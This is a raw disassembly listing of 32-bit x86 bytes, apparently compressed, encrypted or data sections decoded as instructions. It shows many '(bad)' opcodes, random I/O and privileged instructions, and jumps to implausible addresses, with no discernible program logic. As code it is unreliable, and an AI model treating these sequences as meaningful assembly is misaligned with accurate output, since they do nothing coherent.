  422694:	mov    ebp,0x46169103
  422699:	and    eax,0x37a84a8d
  42269e:	fiadd  WORD PTR [ecx-0x5ca0fcbc]
  4226a4:	test   BYTE PTR [ecx+ebx*1-0x10],bh
  4226a8:	cmc    
  4226a9:	xor    bh,BYTE PTR [ecx]
  4226ab:	cmp    al,BYTE PTR [ebx+edx*4+0x76]
  4226af:	dec    eax
  4226b0:	jbe    0x422682
  4226b2:	xchg   esp,eax
  4226b3:	mov    eax,ds:0xe8f5bb0c
  4226b8:	pop    esp
  4226b9:	pushf  
  4226ba:	cmp    esi,edx
  4226bc:	pusha  
  4226bd:	jne    0x4226fc
  4226bf:	cli    
  4226c0:	(bad)  
  4226c1:	push   esp
  4226c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c3:	jl     0x4226df
  4226c5:	aas    
  4226c6:	push   DWORD PTR fs:[ecx-0x24]
  4226ca:	test   eax,0x40364fc
  4226cf:	jmp    0xd8323e44
  4226d4:	pop    edi
  4226d5:	test   al,0x9b
  4226d7:	pusha  
  4226d8:	out    dx,al
  4226d9:	(bad)  
  4226da:	rol    BYTE PTR [eax-0x53],1
  4226dd:	sbb    DWORD PTR [ebx-0x7d],edi
  4226e0:	lods   eax,DWORD PTR ds:[esi]
  4226e1:	enter  0x5bcf,0xb
  4226e5:	fst    DWORD PTR [ebx-0x28]
  4226e8:	sbb    eax,DWORD PTR [edi-0x8]
  4226eb:	push   edi
  4226ec:	arpl   WORD PTR [ebx],di
  4226ee:	mov    dh,0xd4
  4226f0:	stc    
  4226f1:	pop    edi
  4226f2:	sbb    al,0x23
  4226f4:	ja     0x42270d
  4226f6:	pop    ds
  4226f7:	mov    dl,0x3
  4226f9:	mov    edi,0xba1e9b91
  4226fe:	iret   
  4226ff:	sbb    DWORD PTR [edi+0x18fe84fd],0x279d35ef
  422709:	adc    al,0xe3
  42270b:	pop    edi
  42270c:	sysret 
  42270e:	int3   
  42270f:	and    eax,0x76813bfa
  422714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422716:	mov    cl,0x12
  422718:	mov    cl,0x12
  42271a:	mov    edi,0x12f5d3d4
  42271f:	pop    ss
  422720:	sti    
  422721:	mov    al,ds:0xb822b993
  422726:	push   ecx
  422727:	mov    al,0x18
  422729:	push   ds
  42272a:	or     edi,DWORD PTR [ebp-0x1d]
  42272d:	jb     0x4227ab
  42272f:	imul   eax,DWORD PTR [ebx],0xff037fa7
  422735:	pop    esp
  422736:	js     0x4226d9
  422738:	les    edi,FWORD PTR [esi+edx*1-0x7a]
  42273c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42273d:	ins    DWORD PTR es:[edi],dx
  42273e:	pusha  
  42273f:	jmp    0x4227a4
	...
  4227b1:	add    BYTE PTR [eax],al
  4227b3:	add    cl,dl
  4227b5:	mov    al,ds:0xf9f9e0b9
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	dec    edi
  4227c1:	adc    eax,0x705175ba
  4227c6:	add    DWORD PTR [eax],eax
  4227c8:	cmc    
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    ch,ch
  4227cd:	loop   0x42275a
  4227cf:	popf   
  4227d0:	mov    esp,0xa2680b5c
  4227d5:	cmp    dh,BYTE PTR [esi-0x29a20714]
  4227db:	test   al,0x73
  4227dd:	pop    eax
  4227de:	das    
  4227df:	push   0x9be9f761
  4227e4:	out    dx,al
  4227e5:	xchg   ecx,eax
  4227e6:	dec    esp
  4227e7:	mov    dl,dl
  4227e9:	shl    DWORD PTR [esi-0x80],cl
  4227ec:	jg     0x422864
  4227ee:	in     eax,dx
  4227ef:	in     al,dx
  4227f0:	popf   
  4227f1:	jecxz  0x42279f
  4227f3:	cdq    
  4227f4:	or     BYTE PTR [edi],al
  4227f6:	into   
  4227f7:	and    dh,cl
  4227f9:	ss mov bh,0xe5
  4227fc:	push   ss
  4227fd:	nop
  4227fe:	inc    ecx
  4227ff:	data16 (bad) 
  422801:	scas   eax,DWORD PTR es:[edi]
  422802:	cmp    al,0xe3
  422804:	out    0xf4,eax
  422806:	lods   eax,DWORD PTR ds:[esi]
  422807:	pop    ds
  422808:	push   ebp
  422809:	pop    ds
  42280a:	addr16 xchg edi,eax
  42280c:	mov    edi,0x60ca4890
  422811:	push   es
  422812:	jns    0x42279e
  422814:	push   esi
  422815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422816:	fisttp DWORD PTR [ebx+eax*2-0x1f94c671]
  42281d:	aaa    
  42281e:	mov    bh,0xe4
  422820:	add    eax,0xf976663e
  422825:	cmp    al,0xe
  422827:	(bad)  [ebp-0xa7b463e]
  42282d:	mov    WORD PTR [eax+0x70],ds
  422830:	sbb    eax,0x39575e2c
  422835:	outs   dx,BYTE PTR ds:[esi]
  422836:	xor    eax,0x8908778f
  42283b:	push   0x2c
  42283d:	xchg   edx,eax
  42283e:	pop    edx
  42283f:	jmp    0x4227e7
  422841:	fst    DWORD PTR [ebp+ecx*2-0x54012665]
  422848:	jge    0x4227d3
  42284a:	and    esi,ebp
  42284c:	call   0x985f6739
  422851:	cmp    BYTE PTR [ebx+0xe],0x18
  422855:	xchg   edi,eax
  422856:	(bad)  
  422857:	adc    ebx,DWORD PTR [edi]
  422859:	fsubrp st(7),st
  42285b:	or     al,0xd3
  42285d:	sar    DWORD PTR [esp+edx*8-0x7867078f],1
  422864:	pop    esp
  422865:	pusha  
  422866:	outs   dx,BYTE PTR ds:[esi]
  422867:	jge    0x42284e
  422869:	xor    eax,0xf4a8f972
  42286e:	or     al,bh
  422870:	shl    BYTE PTR [edi+eax*8+0x2b265cce],1
  422877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422878:	lock sbb cl,BYTE PTR [edx]
  42287b:	jnp    0x4228c5
  42287d:	outs   dx,BYTE PTR ds:[esi]
  42287e:	mov    al,0x45
  422880:	sbb    al,0xa1
  422882:	jae    0x4228f5
  422884:	scas   al,BYTE PTR es:[edi]
  422885:	and    al,0xbb
  422887:	sbb    BYTE PTR [ecx+0xd02e25b],dh
  42288d:	leave  
  42288e:	push   ebp
  42288f:	aas    
  422890:	inc    ebp
  422891:	sub    BYTE PTR [esi-0x5d],ah
  422894:	inc    ecx
  422895:	test   eax,0xb604b93b
  42289a:	sbb    dl,BYTE PTR [esi+ebx*1-0x1]
  42289e:	mov    bh,0x67
  4228a0:	and    ebx,DWORD PTR [edx]
  4228a2:	out    dx,al
  4228a3:	addr16 aaa 
  4228a5:	loope  0x4228e0
  4228a7:	out    dx,eax
  4228a8:	mov    dl,0x60
  4228aa:	in     eax,0x6c
  4228ac:	addr16 ret 
  4228ae:	push   esp
  4228af:	push   ebp
  4228b0:	out    0x42,al
  4228b2:	into   
  4228b3:	aaa    
  4228b4:	mov    esp,gs
  4228b6:	jae    0x4228aa
  4228b8:	dec    ebp
  4228b9:	out    0x45,al
  4228bb:	repnz bound ebp,QWORD PTR [eax+0x169b90]
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	pop    ss
  422941:	scas   al,BYTE PTR es:[edi]
  422942:	inc    esi
  422943:	loop   0x42298b
  422945:	jno    0x422948
  422947:	add    ch,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    bl,bh
  42294d:	sbb    BYTE PTR [ecx-0x6b],al
  422950:	shl    BYTE PTR [ebp+0x1f],1
  422953:	aas    
  422954:	neg    DWORD PTR [edi+0x22fb1ed2]
  42295a:	inc    ebx
  42295b:	into   
  42295c:	xor    BYTE PTR [edx+ebp*2+0x50],bh
  422960:	or     ebp,esp
  422962:	pop    ss
  422963:	inc    edi
  422964:	pop    ss
  422965:	add    BYTE PTR [esi],dh
  422967:	(bad)  
  422968:	cld    
  422969:	je     0x42297a
  42296b:	popa   
  42296c:	mov    esp,0x5bc98085
  422971:	mov    bh,0xaf
  422973:	mul    DWORD PTR [esi]
  422975:	jp     0x422935
  422977:	icebp  
  422978:	(bad)  [ebx-0x15]
  42297b:	outs   dx,DWORD PTR ds:[esi]
  42297c:	fild   WORD PTR [edx+ecx*8-0x4c8e9ec1]
  422983:	stos   DWORD PTR es:[edi],eax
  422984:	lods   al,BYTE PTR ds:[esi]
  422985:	iret   
  422986:	jmp    0x42296e
  422988:	pop    esi
  422989:	xadd   DWORD PTR [ebx+0xa],eax
  42298d:	sub    bh,BYTE PTR [eax]
  42298f:	cld    
  422990:	xor    cl,BYTE PTR [edi-0x28]
  422993:	rol    BYTE PTR [esi-0x2917bda6],cl
  422999:	icebp  
  42299a:	adc    al,0x8c
  42299c:	out    0xa7,al
  42299e:	hlt    
  42299f:	push   ds
  4229a0:	mov    al,0x69
  4229a2:	inc    ebx
  4229a3:	out    dx,al
  4229a4:	mov    ah,dh
  4229a6:	ret    0xde2e
  4229a9:	aam    0x65
  4229ab:	mov    edi,0x5211941b
  4229b0:	push   esi
  4229b1:	push   esp
  4229b2:	test   BYTE PTR [ecx-0x2c],bl
  4229b5:	xchg   esi,eax
  4229b6:	lea    edx,[ebx+eax*1+0x5c124ad1]
  4229bd:	mov    bl,0x16
  4229bf:	adc    bh,BYTE PTR [ecx-0x29]
  4229c2:	sti    
  4229c3:	iret   
  4229c4:	aaa    
  4229c5:	test   DWORD PTR [ebx+0x11],edi
  4229c8:	push   ecx
  4229c9:	stos   BYTE PTR es:[edi],al
  4229ca:	xor    al,BYTE PTR [ebx-0x350b92bc]
  4229d0:	popf   
  4229d1:	leave  
  4229d2:	adc    DWORD PTR [eax-0x12],0x97200cae
  4229d9:	mov    ds:0x7a5fed33,eax
  4229de:	mov    eax,0x66c4af6f
  4229e3:	hlt    
  4229e4:	fdivr  DWORD PTR [ecx]
  4229e6:	push   ds
  4229e7:	sub    bl,BYTE PTR [ebx-0x63333280]
  4229ed:	cs xchg esp,eax
  4229ef:	jmp    0xa8ec6a1
  4229f4:	dec    ebx
  4229f5:	mov    ebp,DWORD PTR [ebx-0x6c012ad8]
  4229fb:	push   esp
  4229fc:	(bad)  
  4229fd:	cmp    BYTE PTR ds:[ecx],dh
  422a00:	mov    ebx,0xcf45b01d
  422a05:	sub    BYTE PTR [esi],ch
  422a07:	jbe    0x422a51
  422a09:	(bad)  
  422a0a:	add    bl,0x15
  422a0d:	sbb    eax,0x3b7f7ca1
  422a12:	sbb    DWORD PTR [esi-0x18],ecx
  422a15:	aaa    
  422a16:	dec    esp
  422a17:	repz into 
  422a19:	jg     0x422a1e
  422a1b:	gs jbe 0x422a65
  422a1e:	or     esp,DWORD PTR [eax]
  422a20:	cmp    DWORD PTR [eax],edx
  422a22:	xor    bl,ch
  422a24:	ss inc edi
  422a26:	xchg   DWORD PTR [ebx],edx
  422a28:	xchg   ebp,eax
  422a29:	sbb    DWORD PTR [eax],0x5d
  422a2c:	mov    esi,0xa46ad6e0
  422a31:	or     DWORD PTR [eax],ebx
  422a33:	and    ebx,ebx
  422a35:	add    eax,0x4efc028
  422a3a:	call   0xdac24e91
  422a3f:	test   al,0xaa
	...
  422ab1:	add    BYTE PTR [eax],al
  422ab3:	add    BYTE PTR [esi],dl
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	lahf   
  422ac1:	mov    ah,0x90
  422ac3:	and    DWORD PTR [ebx],edi
  422ac5:	jb     0x422ac8
  422ac7:	add    ch,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [edi+0x51d4ae9a],dh
  422ad1:	add    esi,ecx
  422ad3:	push   eax
  422ad4:	neg    ah
  422ad6:	dec    ebx
  422ad7:	and    esp,0x387641ca
  422add:	leave  
  422ade:	xor    BYTE PTR [edi+0xc0ab920],0xc0
  422ae5:	adc    ebp,eax
  422ae7:	fisttp QWORD PTR [ebx+ebx*4+0x7b]
  422aeb:	mov    ds:0x5635e63d,eax
  422af0:	lea    esi,[ebp-0x58a53d45]
  422af6:	sbb    BYTE PTR [ecx+0x7f531129],dl
  422afc:	icebp  
  422afd:	xchg   ebp,esp
  422aff:	jg     0x422b0f
  422b01:	mov    ecx,0xf7bd2ed5
  422b06:	jecxz  0x422b74
  422b08:	pop    edi
  422b09:	mov    ebp,0xd1461aff
  422b0e:	repnz addr16 int3 
  422b11:	inc    edx
  422b12:	add    BYTE PTR [eax+ebp*8-0x20],cl
  422b16:	lock mov BYTE PTR [ebx+edi*4-0x6],bl
  422b1b:	enter  0xf541,0x89
  422b1f:	mov    edi,0x84d78792
  422b24:	sub    BYTE PTR [ebp+0x3a],ch
  422b27:	push   ebx
  422b28:	outs   dx,DWORD PTR ds:[esi]
  422b29:	and    BYTE PTR [ecx+0x331ebcff],dh
  422b2f:	popa   
  422b30:	aaa    
  422b31:	lds    edi,FWORD PTR [ecx]
  422b33:	fisttp QWORD PTR [ebp+0x4f]
  422b36:	pop    ecx
  422b37:	cli    
  422b38:	loopne 0x422ad7
  422b3a:	clc    
  422b3b:	jle    0x422b1d
  422b3d:	es push ebp
  422b3f:	and    al,dh
  422b41:	not    DWORD PTR [ebx]
  422b43:	and    ah,BYTE PTR [edx+0x673a9f17]
  422b49:	mov    ebp,0xfb4e3811
  422b4e:	mov    ebx,0xa25f58d5
  422b53:	sub    cl,bl
  422b55:	cmp    al,0xde
  422b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b58:	add    edi,0xb9e750bd
  422b5e:	inc    edx
  422b5f:	aam    0xb2
  422b61:	sub    esi,ebx
  422b63:	dec    ebx
  422b64:	loopne 0x422bb2
  422b66:	xor    al,0x1
  422b68:	data16 add cl,ch
  422b6b:	pushf  
  422b6c:	mov    eax,0x8a5a6e77
  422b71:	xor    DWORD PTR [ecx+0x656540fb],eax
  422b77:	popf   
  422b78:	adc    eax,0x81b8d78c
  422b7d:	sub    DWORD PTR [edx+0x1b8ac701],ebx
  422b83:	mov    ecx,0x4dc5af7e
  422b88:	sub    eax,0x639c88e7
  422b8d:	sub    BYTE PTR [edx+0x78239f06],ch
  422b93:	sbb    eax,0xd1f5d0a1
  422b98:	aam    0x7a
  422b9a:	jns    0x422b41
  422b9c:	test   BYTE PTR [edi],dl
  422b9e:	cmp    eax,0x5203332a
  422ba3:	nop
  422ba4:	sbb    eax,0x7d6cdd48
  422ba9:	sar    DWORD PTR [edi-0x63ccac1e],0x1c
  422bb0:	sub    bh,al
  422bb2:	pop    edi
  422bb3:	hlt    
  422bb4:	popf   
  422bb5:	jnp    0x422c12
  422bb7:	mov    ecx,0x20842cf1
  422bbc:	sub    bl,BYTE PTR [eax+0xc07a0]
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	clc    
  422c41:	dec    edx
  422c42:	xor    DWORD PTR [ecx+0x30],edi
  422c45:	jae    0x422c48
  422c47:	add    ch,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebx-0x1f],bh
  422c4e:	push   esi
  422c4f:	std    
  422c50:	inc    eax
  422c51:	shl    DWORD PTR [edx],0x9d
  422c54:	dec    ecx
  422c55:	imul   ecx,edx,0x6b
  422c58:	sub    DWORD PTR [esi],edx
  422c5a:	jnp    0x422bf7
  422c5c:	fstp   TBYTE PTR [eax+0x564dc5a3]
  422c62:	sub    edi,esp
  422c64:	cmp    dh,dh
  422c66:	rol    DWORD PTR [edi+0x47],cl
  422c69:	jae    0x422c35
  422c6b:	mov    dh,0x58
  422c6d:	call   0x1617:0xd6461ac1
  422c74:	loop   0x422cd3
  422c76:	push   esp
  422c77:	test   dh,bh
  422c79:	sub    edi,edx
  422c7b:	push   0x840f80fe
  422c80:	sahf   
  422c81:	repnz dec eax
  422c83:	shl    BYTE PTR [esi-0x52],cl
  422c86:	add    eax,0xe9c4f623
  422c8b:	arpl   WORD PTR [edi+ebp*8+0x63],bp
  422c8f:	jb     0x422c3b
  422c91:	call   0x2426:0x3f514915
  422c98:	and    edi,DWORD PTR [ecx+0x43]
  422c9b:	fiadd  WORD PTR [edx]
  422c9d:	xchg   DWORD PTR ds:0x19465139,ebp
  422ca3:	adc    esi,DWORD PTR [edi+0xa042ad5]
  422ca9:	fsub   QWORD PTR [esi+ebp*1+0x21]
  422cad:	xchg   esi,eax
  422cae:	add    DWORD PTR [ebx],ebp
  422cb0:	(bad)  
  422cb1:	arpl   WORD PTR [edi+0x30433b22],ax
  422cb7:	pusha  
  422cb8:	sub    eax,0x737686bb
  422cbd:	pop    ecx
  422cbe:	stc    
  422cbf:	ret    
  422cc0:	or     BYTE PTR [ebp+0x3656aadb],dl
  422cc6:	adc    bl,BYTE PTR [ebx]
  422cc8:	adc    eax,0x405dd32b
  422ccd:	mov    esp,0xa26f3c6c
  422cd2:	dec    edx
  422cd3:	xchg   edi,eax
  422cd4:	xchg   ebx,eax
  422cd5:	jnp    0x422d2c
  422cd7:	es paddusb mm2,mm0
  422cdb:	call   0x7f0a:0xad84ce46
  422ce2:	add    BYTE PTR [ebx-0x67111515],ah
  422ce8:	ins    DWORD PTR es:[edi],dx
  422ce9:	adc    BYTE PTR [esp+esi*2-0x2a],ah
  422ced:	(bad)  
  422cee:	fsubr  DWORD PTR [ebx+0x36f12644]
  422cf4:	mov    ebx,0xe77cfdc7
  422cf9:	das    
  422cfa:	push   ss
  422cfb:	loope  0x422cd3
  422cfd:	add    al,0x82
  422cff:	adc    bh,bh
  422d01:	dec    edx
  422d02:	xor    BYTE PTR [ebp+0x6507977],bh
  422d08:	dec    ebp
  422d09:	ret    0x3137
  422d0c:	mov    edi,0xd3ab919f
  422d11:	cmp    dh,dl
  422d13:	mov    al,0x13
  422d15:	push   edi
  422d16:	(bad)  
  422d17:	pop    ss
  422d18:	jle    0x422d59
  422d1a:	or     al,0x38
  422d1c:	sbb    dh,dh
  422d1e:	(bad)  
  422d1f:	retfw  
  422d21:	add    edx,esi
  422d23:	outs   dx,DWORD PTR ds:[esi]
  422d24:	xchg   ecx,eax
  422d25:	mov    eax,0x63243b28
  422d2a:	mov    esp,0x5713117c
  422d2f:	rcl    esi,0x6b
  422d32:	mov    ecx,0x3e7b0caa
  422d37:	cmc    
  422d38:	test   al,0xf3
  422d3a:	imul   esp,DWORD PTR [edi],0xbc46b3e8
  422d40:	and    eax,DWORD PTR [eax]
	...
  422db2:	add    BYTE PTR [eax],al
  422db4:	iret   
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x4f0af9f7
  422dc2:	outs   dx,DWORD PTR ds:[esi]
  422dc3:	stc    
  422dc4:	and    eax,0xf5000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [eax],al
  422dcd:	push   edi
  422dce:	jp     0x422e06
  422dd0:	mov    al,ds:0xf2a7ba5a
  422dd5:	jle    0x422ded
  422dd7:	or     al,0xee
  422dd9:	fstp   QWORD PTR [eax+0x4b]
  422ddc:	sti    
  422ddd:	sti    
  422dde:	std    
  422ddf:	mov    DWORD PTR [ebx],edx
  422de1:	fbld   TBYTE PTR [ebx+0x7751e37f]
  422de7:	xlat   BYTE PTR ds:[ebx]
  422de8:	sti    
  422de9:	inc    eax
  422dea:	add    eax,0xa9f5321d
  422def:	ja     0x422e55
  422df1:	push   cs
  422df2:	arpl   WORD PTR [esi+0x31d7cc11],dx
  422df8:	push   0xffffffea
  422dfa:	dec    ebp
  422dfb:	(bad)  
  422dfc:	sbb    dl,bh
  422dfe:	jno    0x422db1
  422e00:	fs in  al,dx
  422e02:	inc    edi
  422e03:	call   0x729628c3
  422e08:	xor    BYTE PTR [eax],ch
  422e0a:	imul   eax,DWORD PTR [eax-0x20],0x5f
  422e0e:	scas   al,BYTE PTR es:[edi]
  422e0f:	xchg   esp,esi
  422e11:	push   eax
  422e12:	push   eax
  422e13:	xor    eax,0x929544f4
  422e18:	je     0x422da5
  422e1a:	and    ecx,DWORD PTR [ebx]
  422e1c:	xor    cl,ah
  422e1e:	sbb    ah,BYTE PTR [edx-0x7707a04b]
  422e24:	sbb    BYTE PTR [ecx+0x53],al
  422e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e28:	mov    ds:0x935787fc,al
  422e2d:	das    
  422e2e:	push   0x1d
  422e30:	mov    al,ds:0x609585fb
  422e35:	int3   
  422e36:	inc    edx
  422e37:	icebp  
  422e38:	mov    dh,0x54
  422e3a:	jl     0x422de5
  422e3c:	sar    BYTE PTR [edx],1
  422e3e:	sub    eax,DWORD PTR es:[edx]
  422e41:	dec    ecx
  422e42:	outs   dx,BYTE PTR ds:[esi]
  422e43:	sbb    di,WORD PTR [eax-0x5f]
  422e47:	cs xchg ecx,eax
  422e49:	sbb    eax,0xd3b96a6b
  422e4e:	cmp    BYTE PTR [ecx-0x460b1014],bh
  422e54:	adc    bh,bh
  422e56:	mov    al,0xc
  422e58:	pop    edx
  422e59:	inc    ecx
  422e5a:	sar    DWORD PTR [edx-0x27],1
  422e5d:	jbe    0x422e67
  422e5f:	sbb    al,0x4c
  422e61:	inc    esi
  422e62:	out    0x15,eax
  422e64:	neg    dl
  422e66:	and    DWORD PTR [ebx-0x58],esi
  422e69:	popa   
  422e6a:	sub    eax,0x605ccbaf
  422e6f:	sub    DWORD PTR [esi],0x70
  422e72:	and    eax,0x1c00949b
  422e77:	les    ebp,FWORD PTR [ecx]
  422e79:	cwde   
  422e7a:	sub    al,0xfe
  422e7c:	dec    esi
  422e7d:	or     al,0x97
  422e7f:	jmp    0x422eb8
  422e81:	shr    dl,1
  422e83:	mov    cl,0xae
  422e85:	clc    
  422e86:	mov    eax,ds:0x302454a5
  422e8b:	leave  
  422e8c:	push   es
  422e8d:	popf   
  422e8e:	pop    DWORD PTR [esi]
  422e90:	ins    DWORD PTR es:[edi],dx
  422e91:	push   ecx
  422e92:	jns    0x422ef0
  422e94:	les    esi,FWORD PTR [ebx+0x1e]
  422e97:	aad    0x3f
  422e99:	pop    edx
  422e9a:	sahf   
  422e9b:	jmp    0x76789eb1
  422ea0:	shl    DWORD PTR [edx-0x51],1
  422ea3:	dec    ebx
  422ea4:	es push edx
  422ea6:	or     ebx,ecx
  422ea8:	rcr    dh,0x96
  422eab:	pop    ebp
  422eac:	(bad)  
  422ead:	int3   
  422eae:	es rcr dl,1
  422eb1:	mov    dh,0x54
  422eb3:	pop    esi
  422eb4:	jle    0x422e98
  422eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422eb7:	mov    ds:0x3cb3a71a,eax
  422ebc:	aad    0x92
  422ebe:	(bad)
	...
  422f32:	add    BYTE PTR [eax],al
  422f34:	imul   eax,DWORD PTR [esi],0xffffff8f
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    bl,BYTE PTR fs:[bp-0x31b6]
  422f43:	jnp    0x422f5f
  422f45:	jne    0x422f48
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    BYTE PTR [ebx+0x6e],dh
  422f4e:	(bad)  
  422f4f:	push   eax
  422f50:	mov    ds:0xe6f419bb,al
  422f55:	jbe    0x422f00
  422f57:	idiv   BYTE PTR [edx]
  422f59:	imul   esi,esp,0xc
  422f5c:	or     DWORD PTR [edx-0x13],ebx
  422f5f:	xchg   esp,eax
  422f60:	push   0xffffffec
  422f62:	test   al,0xce
  422f64:	mov    ch,0x38
  422f66:	jecxz  0x422f56
  422f68:	lods   al,BYTE PTR ds:[esi]
  422f69:	ror    DWORD PTR [eax+0x7e],0xcd
  422f6d:	and    ebp,DWORD PTR [esi]
  422f6f:	std    
  422f70:	dec    ebx
  422f71:	cs inc ebp
  422f73:	mov    BYTE PTR [edi+edx*4],bh
  422f76:	(bad)  
  422f77:	sub    ebx,ebx
  422f79:	pusha  
  422f7a:	push   ebx
  422f7b:	outs   dx,BYTE PTR ds:[esi]
  422f7c:	pop    edi
  422f7d:	xor    al,0xb5
  422f7f:	xchg   ebp,eax
  422f80:	push   ds
  422f81:	inc    esp
  422f82:	jns    0x422fbc
  422f84:	mov    cl,0xfd
  422f86:	xchg   esi,eax
  422f87:	mov    WORD PTR [edi+0x1e],gs
  422f8a:	cli    
  422f8b:	adc    al,0x45
  422f8d:	mov    eax,ds:0x623d9565
  422f92:	add    BYTE PTR [eax],al
  422f94:	call   FWORD PTR [esi]
  422f96:	sahf   
  422f97:	popf   
  422f98:	mov    ch,BYTE PTR [ecx]
  422f9a:	popa   
  422f9b:	pop    eax
  422f9c:	jmp    0x422ffd
  422f9e:	hlt    
  422f9f:	gs dec eax
  422fa1:	pop    ecx
  422fa2:	fnsave [edx+0xf]
  422fa5:	xor    ebp,DWORD PTR [ebp-0x57]
  422fa8:	dec    edi
  422fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422faa:	dec    edi
  422fab:	adc    cl,dh
  422fad:	sbb    edi,DWORD PTR [ecx+0x8c4de79]
  422fb3:	mov    es,WORD PTR [eax]
  422fb5:	jae    0x422f8f
  422fb7:	enter  0xa8f9,0x6e
  422fbb:	pop    es
  422fbc:	sub    BYTE PTR [ebx+0x7b02e670],dh
  422fc2:	outs   dx,DWORD PTR ds:[esi]
  422fc3:	dec    eax
  422fc4:	es xchg esp,eax
  422fc6:	in     al,dx
  422fc7:	fwait
  422fc8:	xchg   DWORD PTR [edi-0x6a65a5bf],esi
  422fce:	pop    edi
  422fcf:	push   esi
  422fd0:	leave  
  422fd1:	or     edx,DWORD PTR [eax-0x1b]
  422fd4:	aam    0x49
  422fd6:	div    dh
  422fd8:	adc    ecx,DWORD PTR [ebp+0x3d704d9b]
  422fde:	dec    ebp
  422fdf:	xor    ah,BYTE PTR [eax-0x59]
  422fe2:	scas   al,BYTE PTR es:[edi]
  422fe3:	cmp    ecx,DWORD PTR ds:[esi]
  422fe6:	dec    ecx
  422fe7:	xor    esp,DWORD PTR [ecx]
  422fe9:	xor    DWORD PTR [edi-0x34],esp
  422fec:	add    cl,BYTE PTR [ebx+edx*1-0x38f79901]
  422ff3:	inc    edx
  422ff4:	ret    
  422ff5:	pop    es
  422ff6:	into   
  422ff7:	call   0x9b88:0xbd90c5b5
  422ffe:	mov    dh,0x43
  423000:	xor    ebx,DWORD PTR [edi]
  423002:	not    BYTE PTR [edi-0x661397a4]
  423008:	add    esp,DWORD PTR [ecx]
  42300a:	or     al,0x80
  42300c:	lods   al,BYTE PTR ds:[esi]
  42300d:	and    BYTE PTR [ebx+eiz*1],bh
  423010:	add    ecx,DWORD PTR [ecx]
  423012:	dec    esi
  423013:	jge    0x42301b
  423015:	sbb    esi,DWORD PTR [ecx+0x47473e97]
  42301b:	dec    edi
  42301c:	mov    al,0x42
  42301e:	sub    DWORD PTR [eax],0xffffff82
  423021:	xchg   ecx,eax
  423022:	mov    eax,DWORD PTR [edi]
  423024:	or     ch,BYTE PTR [ebp+0x56]
  423027:	pop    ecx
  423028:	std    
  423029:	pop    ds
  42302a:	sbb    BYTE PTR [edi+0x5],ch
  42302d:	jle    0x423003
  42302f:	retf   
  423030:	(bad)  
  423031:	or     al,0xc7
  423033:	(bad)  
  423034:	cmp    edx,DWORD PTR [ecx]
  423036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423037:	out    0xa7,eax
  423039:	xchg   DWORD PTR [ecx-0x68],esp
  42303c:	sti    
  42303d:	mov    ch,0xbf
  42303f:	outs   dx,BYTE PTR ds:[esi]
  423040:	xor    BYTE PTR [eax],al
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	iret   
  4230c1:	sbb    BYTE PTR [ecx+0x15],dl
  4230c4:	pcmpeqd mm0,QWORD PTR [ecx]
  4230c7:	add    ch,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    ah,bh
  4230cd:	add    al,0x32
  4230cf:	aaa    
  4230d0:	lock addr16 push 0x2ec273ff
  4230d7:	daa    
  4230d8:	jmp    0x4230d3
  4230da:	mov    es,WORD PTR cs:[eax-0x32]
  4230de:	xchg   ebp,eax
  4230df:	(bad)  
  4230e0:	cmc    
  4230e1:	fstp   TBYTE PTR [ecx-0x240223a5]
  4230e7:	mov    edi,0xfd2dcfc1
  4230ec:	add    BYTE PTR [ebx+0x12939635],bh
  4230f2:	xor    eax,0x518fbb5b
  4230f7:	scas   eax,DWORD PTR es:[edi]
  4230f8:	xchg   edi,eax
  4230f9:	iret   
  4230fa:	push   ss
  4230fb:	bound  esp,QWORD PTR cs:[edi-0x28fc9a85]
  423102:	add    DWORD PTR [esi-0x1aa12ee2],0x399fee24
  42310c:	loop   0x423102
  42310e:	les    edx,FWORD PTR [eax]
  423110:	add    ecx,DWORD PTR [ebp+0x35455608]
  423116:	cmp    eax,DWORD PTR [eax+0x50]
  423119:	hlt    
  42311a:	pop    es
  42311b:	push   edx
  42311c:	cmc    
  42311d:	les    ecx,FWORD PTR [eax]
